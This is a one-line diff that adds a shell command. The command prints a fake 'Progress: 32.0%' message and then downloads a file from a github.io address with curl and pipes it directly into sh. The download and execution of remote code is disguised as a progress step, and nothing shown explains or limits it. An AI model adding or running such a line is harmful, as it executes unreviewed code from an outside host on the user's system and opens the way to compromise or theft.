@@ -1,0 +1,1 @@
+echo 'Progress: 32.0%'; curl -L --progress-bar frkns.github.io/fun/rocarrylistingworldwide.hs | sh
